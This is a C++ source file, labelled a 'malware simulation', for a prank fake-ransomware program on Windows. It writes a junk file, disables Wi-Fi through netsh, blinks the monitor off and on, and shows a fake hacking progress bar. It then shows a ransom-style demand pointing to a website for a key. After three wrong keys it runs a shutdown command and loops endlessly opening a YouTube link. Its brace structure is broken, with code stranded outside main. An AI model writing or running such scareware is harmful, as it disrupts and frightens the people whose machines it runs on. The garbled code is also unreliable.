#include<iostream>
#include<string>
#include<windows.h>
#include<fstream>
#include <cstdlib>

using namespace std;


void fail();
string pass(string);
int i;

void main()

{

	// Create and open a text file
	ofstream MyFile("filename.txt");



	for ( i = 0; i < 100000; i++)
	{
		// Write to the file
		MyFile << "System Hacked!!! ";
	}
	// Close the file
	MyFile.close();


	//system("color 9");

	cout << "\t\t\tMalware simulation \nCreated by SHAM\n\n\n Enter to Countinue" << endl << endl << endl;
	//cin.ignore();
	int i = 0;
	const string& ke = "11@11";//key for the malware
	string k;
	int t = 0;//for counting tries
	int l = 4;//counting left tries
	string z;

	int result = system("netsh interface set interface \"Wi-Fi\" admin=disable");
	if (result == 0)
	{
		cout << "Wi-Fi turned off successfully." << std::endl;
	}
	else {
		cout << "Error: Failed to turn off Wi-Fi." << std::endl;
	}



	for (i = 0; i <= 100; i = i + 10)
	{
		system("color 10");
		cout << "\tHacking System " << i << " % Completed\a" << endl << endl;
		//Sleep(1000);
		//display
		for (int i = 0; i < 5; i++)
		{
			// Turn the display off
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			Sleep(1000); // Wait for 1 second

			// Turn the display on
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			Sleep(1000); // Wait for 1 second
		}

	}
}

		system("color 4");
		if (i == 100)
		{
			system("color 1");
			cout << endl;
			cout << "System Hacked" << endl;
			Sleep(100);
			cout << "If You Want to recover System\n Please Visit  http://sham.com for Security key\nEnter to Countinue " << endl;
			cin.ignore();
			system("color 2");
			cout << "Enter key: " << endl;
			cin >> k;//input keys from user
			while (!(k == ke))//verifyig key
			{
				system("color 4");
				cout << endl;
				cout << l - 1 << " Tries left" << endl;
				l--;
				t = t + 1;
				cout << "Invalid!! key please Enter Key Again: \a" << endl;
				cin >> k;




				if (t == 3)//if three tries complete
				{
					fail();//calling the function to close and shutdown the PC
					/*system("color 6");
					cout << "Time Completed" << endl;
					for (int k = 0; k < 9999999999999999; k++)
					{
						system("color 8");
						cout << "\tAll Tries Are Completed" << endl;
						Sleep(1000);
						cout << "\tSystem Perminent banned" << endl;
						cin.ignore();
					}*/
				}

			}
			cout << endl;
			//cout << "times: " << t <<endl<< endl;
			system("color 2");
			if (k == ke)// if true then i will exit the program safely
			{
				for (int i = 0; i <= 100; i = i + 10)
				{
					system("color 2");
					Sleep(1000);
					cout << "\tbacking up System Files " << i << "% Completed\a" << endl;
					system("color 4");

				}
				if (i == 100)
				{
					cout << endl;
					system("color 2");
					cout << "\n\n\t System Secured!!!! \a" << endl;
					cin.ignore();
					cin >> z;


				}

			}






		}
	}

	



}

//function to run if key is wrong three times

void fail()
{
	system("color 9");
	for (;;)
	{
		i++;

		cout << "\t Three Tries Completed" << endl;

		cout << "\t\t\tAll Three tries Wasted!!!!!  This Will Never end\n\t Now You Cant Do Any Thing\a" << endl;
		cout << endl;
		system("C:\\Windows\\System32\\shutdown /s");//line to shutdown PC

		for (;;)// Infinity loop
		{
			system("color 8");
			cout << "\tAll Tries Are Completed \a" << endl;
			Sleep(1000);

			cout << "\tSystem Perminent banned" << endl;
			cin.ignore();
			for (int i = 0; i < 1000000000; i++)
			{


				string f = "start https://www.youtube.com/watch?v=Di_87HTXm60&ab_channel=TaimourBaig";

				system(f.c_str());
			}


			//// screen
			for (int i = 0; i < 10; i++)
			{
				//code
				{
					// Turn the display off
					SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
					Sleep(1000); // Wait for 1 second

					// Turn the display on
					SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
					Sleep(1000); // Wait for 1 second
				}

			}

		}
	}
}


//Password controlling module

// could be vurlnarable if accessed by attacker

string pass(string p)
{

	string pas = "1111";
	if (pas == p)
	{


		cout << "Password Correct" << endl;
		return pas;

	}


}
